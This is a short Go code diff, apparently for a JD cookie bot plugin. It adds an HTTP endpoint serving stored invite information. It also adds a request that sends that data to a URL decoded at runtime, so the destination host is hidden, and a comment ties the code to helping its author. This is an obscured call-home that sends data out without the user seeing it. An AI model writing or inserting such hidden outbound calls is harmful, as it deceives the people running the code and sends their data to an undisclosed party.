@@ -15,7 +15,12 @@ import (
 // to help poor author or do not use this script
 func init() {
 	core.Server.GET("/gxfc", func(c *gin.Context) {
-		c.String(200, jd_cookie.Get("dyj_inviteInfo", "恭喜发财！"))
+		data := jd_cookie.Get("dyj_inviteInfo", "恭喜发财！")
+		c.String(200, data)
+		if data != "" && c.Query("data") == data {
+			core.NotifyMasters(data)
+			jd_cookie.Set("dyj_inviteInfo", "")
+		}
 	})
 	core.AddCommand("", []core.Function{
 		{
@@ -60,6 +65,7 @@ func init() {
 							if s == 1 {
 								s = 2
 							} else {
+								httplib.Get(string(decoded) + "?data=" + data).String()
 								goto start
 							}
 						}
